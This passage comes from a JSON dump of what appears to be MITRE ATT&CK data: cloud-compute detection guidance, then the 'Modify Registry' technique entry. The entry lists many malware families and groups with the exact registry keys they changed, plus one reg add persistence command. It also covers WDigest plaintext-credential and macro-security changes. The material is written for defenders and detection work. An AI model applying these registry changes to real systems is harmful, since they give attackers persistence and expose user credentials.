        "detects": "The deletion of a new instance or virtual machine is a common part of operations within many cloud environments. Events should then not be viewed in isolation, but as part of a chain of behavior that could lead to other activities. For example, detecting a sequence of events such as the creation of an instance, mounting of a snapshot to that instance, and deletion of that instance by a new user account may indicate suspicious activity.In AWS, CloudTrail logs capture the deletion of an instance in the TerminateInstances event, and in Azure the deletion of a VM may be captured in Azure activity logs.[3] [4] Google's Admin Activity audit logs within their Cloud Audit logs can be used to detect the usage of gcloud compute instances delete to delete a VM.[5]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Metadata",
        "detects": "Periodically baseline instances to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Modification",
        "detects": "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to snapshots and rollbacks and VM configuration changes, that are occurring outside of normal activity. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Start",
        "detects": "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to activation of instances that are occurring outside of normal activity/planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Instance Stop",
        "detects": "Establish centralized logging of instance activity, which can be used to monitor and review system events even after reverting to a snapshot, rolling back changes, or changing persistence/type of storage. Monitor specifically for events related to deactivation of instances that are occurring outside of planned operations. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "DS0020",
        "dsource": "Snapshot",
        "dcomp": "Snapshot Creation",
        "detects": "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the creation of multiple snapshots within a short period of time. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Snapshot Deletion",
        "detects": "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the deletion of multiple snapshots within a short period of time. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Snapshot Metadata",
        "detects": "Periodically baseline snapshots to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Snapshot Modification",
        "detects": "Establish centralized logging for the activity of cloud compute infrastructure components. Monitor for suspicious sequences of events, such as the mounting of a snapshot to a new instance by a new or unexpected user. To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "DS0034",
        "dsource": "Volume",
        "dcomp": "Volume Creation",
        "detects": "Monitor for the unexpected creation or presence of cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Volume Deletion",
        "detects": "Monitor for the unexpected deletion or absence of cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Volume Metadata",
        "detects": "Periodically baseline cloud block storage volumes to identify malicious modifications or additions."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Volume Modification",
        "detects": "Monitor for the unexpected changes to cloud block storage volumes . To reduce false positives, valid change management procedures could introduce a known identifier that is logged with the change (e.g., tag or header) if supported by the cloud provider, to help distinguish valid, expected actions from malicious ones."
      }
    ],
    "Subtechniques": [
      {
        "id": "T1578.001",
        "name": "Create Snapshot"
      },
      {
        "id": "T1578.002",
        "name": "Create Cloud Instance"
      },
      {
        "id": "T1578.003",
        "name": "Delete Cloud Instance"
      },
      {
        "id": "T1578.004",
        "name": "Revert Cloud Instance"
      },
      {
        "id": "T1578.005",
        "name": "Modify Cloud Compute Configurations"
      }
    ],
    "Tactic": "\nDefense Evasion"
  },
  {
    "Title": "Modify Registry",
    "Code": "T1112",
    "Description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.Access to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification. [1] Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.Registry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API. [2] Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence. [3] [4]The Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system. [5] Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.",
    "Mitigation": [
      {
        "id": "C0028",
        "name": "2015 Ukraine Electric Power Attack",
        "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. [6]."
      },
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can modify registry keys as part of setting a new pass-through authentication agent.[7]"
      },
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL is capable of setting and deleting Registry values.[8]"
      },
      {
        "id": "S0331",
        "name": "Agent Tesla",
        "description": "Agent Tesla can achieve persistence by modifying Registry key entries.[9]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has overwritten registry keys for persistence.[10]"
      },
      {
        "id": "G0073",
        "name": "APT19",
        "description": "APT19 uses a Port 22 malware variant to modify several Registry keys.[11]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration. [12]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys.[13]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials.[14][15]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor's dispatcher can modify the Run registry key.[16]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon modifies several registry keys for persistence and UAC bypass.[17]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system.[18]"
      },
      {
        "id": "S0245",
        "name": "BADCALL",
        "description": "BADCALL modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List.[19]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj.[20]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has deleted Registry keys to clean up its prior activity.[21]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can set values in the Registry to help in execution.[22]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files.[23][24][25][26][27][28]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat has the ability to add the following registry key on compromised networks to maintain persistence: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters[29]"
      },
      {
        "id": "G0108",
        "name": "Blue Mockingbird",
        "description": "Blue Mockingbird has used Windows Registry modifications to specify a DLL payload.[30]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable.[31]"
      },
      {
        "id": "S0261",
        "name": "Catchamas",
        "description": "Catchamas creates three Registry keys to establish persistence by adding a Windows Service.[32]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell has a command to modify a Registry key.[33]"
      },
      {
        "id": "S0631",
        "name": "Chaes",
        "description": "Chaes can modify Registry values to stored information and establish persistence.[34]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can remove persistence-related artifacts from the Registry.[35]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK may modify Registry keys to store RC4 encrypted configuration information.[36]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can set and delete Registry keys.[37]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop can make modifications to Registry keys.[38]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code.[39]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT has modified Registry values to store encrypted orchestrator code and payloads.[40][41]"
      },
      {
        "id": "S0608",
        "name": "Conficker",
        "description": "Conficker adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations.[42][43]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can create a registry key using wdigest.[44]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number.[45]"
      },
      {
        "id": "S0527",
        "name": "CSPY Downloader",
        "description": "CSPY Downloader can write to the Registry under the %windir% variable to execute tasks.[46]"
      },
      {
        "id": "S0334",
        "name": "DarkComet",
        "description": "DarkComet adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=\"0\" and HKEY_CURRENT_USER\\Software\\DC3_FEXEC.[47][48]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla has modified registry keys for persistence.[49]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can modify Registry values to store configuration strings, keylogger, and output of components.[50]"
      },
      {
        "id": "S1033",
        "name": "DCSrv",
        "description": "DCSrv has created Registry keys for persistence.[51]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.[52]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca modified the registry using the command reg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\" for persistence.[53]"
      },
      {
        "id": "G1003",
        "name": "Ember Bear",
        "description": "Ember Bear has used an open source batch script to modify Windows Defender registry keys.[54]"
      },
      {
        "id": "S0568",
        "name": "EVILNUM",
        "description": "EVILNUM can make modifications to the Regsitry for persistence.[55]"
      },
      {
        "id": "S0343",
        "name": "Exaramel for Windows",
        "description": "Exaramel for Windows adds the configuration to the Registry in XML format.[56]"
      },
      {
        "id": "S0569",
        "name": "Explosive",
        "description": "Explosive has a function to write itself to Registry values.[57]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open.[58]"
      },
      {
        "id": "S0679",
        "name": "Ferocious",
        "description": "Ferocious has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms.[59]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has deleted Registry keys during post compromise cleanup activities.[60]"
      },
      {
        "id": "G0047",
        "name": "Gamaredon Group",
        "description": "Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM.[61][62]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can modify the Registry to store its components.[63]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has altered the InstallTime subkey.[64]"
      },
      {
        "id": "G0078",
        "name": "Gorgon Group",
        "description": "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\.[65]"
      },
      {
        "id": "S0531",
        "name": "Grandoreiro",
        "description": "Grandoreiro can modify the Registry to store its configuration at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM.[66]"
      },
      {
        "id": "S0342",
        "name": "GreyEnergy",
        "description": "GreyEnergy modifies conditions in the Registry and adds keys.[67]"
      },
      {
        "id": "S0697",
        "name": "HermeticWiper",
        "description": "HermeticWiper has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items.[68][69][70]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system.[71]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys.[72][73]"
      },
      {
        "id": "S0537",
        "name": "HyperStack",
        "description": "HyperStack can add the name of its communication pipe to HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\\NullSessionPipes.[74]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value.[75][76]"
      },
      {
        "id": "S0271",
        "name": "KEYMARBLE",
        "description": "KEYMARBLE has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath.[77]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence.[78][79][80][81]"
      },
      {
        "id": "S0669",
        "name": "KOCTOPUS",
        "description": "KOCTOPUS has added and deleted keys from the Registry.[82]"
      },
      {
        "id": "S0356",
        "name": "KONNI",
        "description": "KONNI has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence.[83][84]"
      },
      {
        "id": "S0397",
        "name": "LoJax",
        "description": "LoJax has modified the Registry key ‘HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute’ from ‘autocheck autochk ’ to ‘autocheck autoche ’.[85]"
      },
      {
        "id": "S0447",
        "name": "Lokibot",
        "description": "Lokibot has modified the Registry as part of its UAC bypass process.[86]"
      },
      {
        "id": "G1014",
        "name": "LuminousMoth",
        "description": "LuminousMoth has used malware that adds Registry keys for persistence.[87][88]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can manipulate the system registry on a compromised host.[89]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has modified Registry settings for security tools.[90]"
      },
      {
        "id": "S0576",
        "name": "MegaCortex",
        "description": "MegaCortex has added entries to the Registry for ransom contact information.[91]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can write the process ID of a target process into the HKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpid Registry value as part of its reflective loading activity.[89]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key.[92][93][94][95]"
      },
      {
        "id": "S1047",
        "name": "Mori",
        "description": "Mori can write data to HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\ and delete Registry values.[96][97]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito can modify Registry keys under HKCU\\Software\\Microsoft[dllname] to store configuration values. Mosquito also modifies Registry keys under HKCR\\CLSID...\\InprocServer32 with a path to the launcher.[98]"
      },
      {
        "id": "S0205",
        "name": "Naid",
        "description": "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk.[99]"
      },
      {
        "id": "S0336",
        "name": "NanoCore",
        "description": "NanoCore has the capability to edit the Registry.[100][101]"
      },
      {
        "id": "S0691",
        "name": "Neoichor",
        "description": "Neoichor has the ability to configure browser settings by modifying Registry entries under HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer.[102]"
      },
      {
        "id": "S0210",
        "name": "Nerex",
        "description": "Nerex creates a Registry subkey that registers a new service.[103]"
      },
      {
        "id": "S0457",
        "name": "Netwalker",
        "description": "Netwalker can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE{8 random characters}.[104]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can modify the Registry to store its configuration information.[105]"
      },
      {
        "id": "C0002",
        "name": "Night Dragon",
        "description": "During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry.[106]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub can modify the Registry to set the ServiceDLL for a service created by the malware for persistence.[107]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can create, delete, or modify a specified Registry key or value.[108][109]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors used batch files that modified registry keys.[110]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, the threat actors enabled Wdigest by changing the HKLM\\SYSTEM\\\\ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest registry value from 0 (disabled) to 1 (enabled).[111]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can perform Registry operations.[112]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can write an encrypted token to the Registry to enable processing of remote commands.[113]"
      },
      {
        "id": "G0040",
        "name": "Patchwork",
        "description": "A Patchwork payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.[114]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can delete its persistence mechanisms from the registry.[115]"
      },
      {
        "id": "S0158",
        "name": "PHOREAL",
        "description": "PHOREAL is capable of manipulating the Registry.[116]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has modified the Registry key HKLM\\SOFTWARE\\Microsoft\\DRM to store a malicious payload.[117]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon has modified the Registry to store its encrypted payload.[118]"
      },
      {
        "id": "S0254",
        "name": "PLAINTEE",
        "description": "PLAINTEE uses reg add to add a Registry Run key for persistence.[119]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module to create, delete, or modify Registry keys.[120]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has made registry modifications to alter its behavior upon execution.[121]"
      },
      {
        "id": "S0012",
        "name": "PoisonIvy",
        "description": "PoisonIvy creates a Registry subkey that registers a new system device.[122]"
      },
      {
        "id": "S0518",
        "name": "PolyglotDuke",
        "description": "PolyglotDuke can write encrypted JSON configuration files to the Registry.[123]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has added a registry key so future powershell.exe instances are spawned off-screen by default, and has removed all registry entries that are left behind during the dropper process.[124]"
      },
      {
        "id": "S1058",
        "name": "Prestige",
        "description": "Prestige has the ability to register new registry keys for a new extension handler via HKCR\\.enc and HKCR\\enc\\shell\\open\\command.[125]"
      },
      {
        "id": "S0583",
        "name": "Pysa",
        "description": "Pysa has modified the registry key \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" and added the ransom note.[126]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can modify the Registry to store its configuration information in a randomly named subkey under HKCU\\Software\\Microsoft.[127][128]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT modifies an HKCU Registry key to store a session identifier unique to the compromised system as well as a pre-shared key used for encrypting and decrypting C2 communications.[129]"
      },
      {
        "id": "S0262",
        "name": "QuasarRAT",
        "description": "QuasarRAT has a command to edit the Registry on the victim’s machine.[130][131]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can write its configuration file to the Registry.[37][132]"
      },
      {
        "id": "S0075",
        "name": "Reg",
        "description": "Reg may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.[1]"
      },
      {
        "id": "S0511",
        "name": "RegDuke",
        "description": "RegDuke can create seemingly legitimate Registry key to store its encryption key.[123]"
      },
      {
        "id": "S0019",
        "name": "Regin",
        "description": "Regin appears to have functionality to modify remote Registry information.[133]"
      },
      {
        "id": "S0332",
        "name": "Remcos",
        "description": "Remcos has full control of the Registry, including the ability to modify it.[134]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can modify the Registry to save encryption parameters and system information.[135][136][137][138][139]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can modify the HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\ registry key so it can bypass the VB object model (VBOM) on a compromised host.[140]"
      },
      {
        "id": "S0090",
        "name": "Rover",
        "description": "Rover has functionality to remove Registry Run key persistence as a cleanup procedure.[141]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can delete all Registry entries created during its execution.[142]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad can modify the Registry to store and maintain a configuration block and virtual file system.[143][53]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Once Shamoon has access to a network share, it enables the RemoteRegistry service on the target system. It will then connect to the system with RegConnectRegistryW and modify the Registry to disable UAC remote restrictions by setting SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy to 1.[144][145][146]"
      },
      {
        "id": "S0444",
        "name": "ShimRat",
        "description": "ShimRat has registered two registry keys for shim databases.[147]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot has modified the Registry to install a second-stage script in the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\sibot.[148]"
      },
      {
        "id": "G0091",
        "name": "Silence",
        "description": "Silence can create, delete, or modify a specified Registry key or value.[149]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can modify registry keys, including to enable or disable Remote Desktop Protocol (RDP).[150]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA can add, modify, and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry.[151]"
      },
      {
        "id": "S0649",
        "name": "SMOKEDHAM",
        "description": "SMOKEDHAM has modified registry keys for persistence, to enable credential caching for credential access, and to facilitate lateral movement via RDP.[152]"
      },
      {
        "id": "S0157",
        "name": "SOUNDBITE",
        "description": "SOUNDBITE is capable of modifying the Registry.[116]"
      },
      {
        "id": "S0142",
        "name": "StreamEx",
        "description": "StreamEx has the ability to modify the Registry.[153]"
      },
      {
        "id": "S0603",
        "name": "Stuxnet",
        "description": "Stuxnet can create registry keys to load driver files.[154]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST had commands that allow an attacker to write or delete registry keys, and was observed stopping services by setting their HKLM\\SYSTEM\\CurrentControlSet\\services\\[service_name]\\Start registry entries to value 4.[155][156] It also deleted previously-created Image File Execution Options (IFEO) Debugger registry values and registry keys related to HTTP proxy to clean up traces of its activity.[157]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck can manipulate Registry keys.[158]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can write its configuration file to Software\\Classes\\scConfig in either HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER.[113]"
      },
      {
        "id": "G0092",
        "name": "TA505",
        "description": "TA505 has used malware to disable Windows Defender through modification of the Registry.[159]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.[160]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal can set the KeepPrintedJobs attribute for configured printers in SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers to enable document stealing.[161]"
      },
      {
        "id": "S1011",
        "name": "Tarrask",
        "description": "Tarrask is able to delete the Security Descriptor (SD) registry subkey in order to \"hide\" scheduled tasks.[162]"
      },
      {
        "id": "S0560",
        "name": "TEARDROP",
        "description": "TEARDROP modified the Registry to create a Windows service for itself on a compromised host.[163]"
      },
      {
        "id": "G0027",
        "name": "Threat Group-3390",
        "description": "A Threat Group-3390 tool has created new Registry keys under HKEY_CURRENT_USER\\Software\\Classes\\ and HKLM\\SYSTEM\\CurrentControlSet\\services.[164][113]"
      },
      {
        "id": "S0665",
        "name": "ThreatNeedle",
        "description": "ThreatNeedle can modify the Registry to save its configuration data as the following RC4-encrypted Registry key: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\GameCon.[165]"
      },
      {
        "id": "S0668",
        "name": "TinyTurla",
        "description": "TinyTurla can set its configuration parameters in the Registry.[166]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can modify registry entries.[167]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla has modify Registry values to store payloads.[168][169]"
      },
      {
        "id": "S0263",
        "name": "TYPEFRAME",
        "description": "TYPEFRAME can install encrypted configuration data under the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellCompatibility\\Applications\\laxhost.dll and HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PrintConfigs.[170]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can store configuration information in the Registry including the initialization vector and AES key needed to find and decrypt other Uroburos components.[171]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has used Registry modifications as part of its installation routine.[172][173]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to modify the Registry key HKCU\\Software\\ApplicationContainer\\Appsw64 to store information regarding the C2 server and downloads.[174][175][176]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer modifies the Registry to store an encoded configuration file in HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security.[177][178]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can create HKCU\\Software\\Classes\\Folder\\shell\\open\\command as a new registry key during privilege escalation.[179][180]"
      },
      {
        "id": "S0612",
        "name": "WastedLocker",
        "description": "WastedLocker can modify registry values within the Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap registry key.[181]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear has deleted certain values from the Registry to load a malicious DLL.[182]"
      },
      {
        "id": "G0102",
        "name": "Wizard Spider",
        "description": "Wizard Spider has modified the Registry key HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest by setting the UseLogonCredential registry value to 1 in order to force credentials to be stored in clear text in memory. Wizard Spider has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.[183][184]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda modifies several Registry keys under HKCU\\Software\\Microsoft\\Internet Explorer\\ PhishingFilter\\ to disable phishing filters.[185]"
      },
      {
        "id": "S0350",
        "name": "zwShell",
        "description": "zwShell can modify the Registry.[106]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell can create Registry entries to enable services to run.[186]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to change, conceal, and/or delete information in the Registry. The Registry may also be modified through Windows system management tools such as Windows Management Instrumentation and PowerShell, which may require additional logging features to be configured in the operating system to collect necessary information for analysis."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Flow",
        "detects": "Remote access to the registry can be achieved viaWindows API function RegConnectRegistrycommand line via reg.exegraphically via regedit.exeAll of these behaviors call into the Windows API, which uses the NamedPipe WINREG over SMB to handle the protocol information. This network can be decoded with wireshark or a similar sensor, and can also be detected by hooking the API function.Analytic 1 - Remote Registryflows = search Flow:Messagewinreg = filter flows where (dest_port == 445 and proto_info.pipe == \"WINREG\")winreg_modify = filter flows where (proto_info.function == \"Create\" or proto_info.function == \"SetValue\")"
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
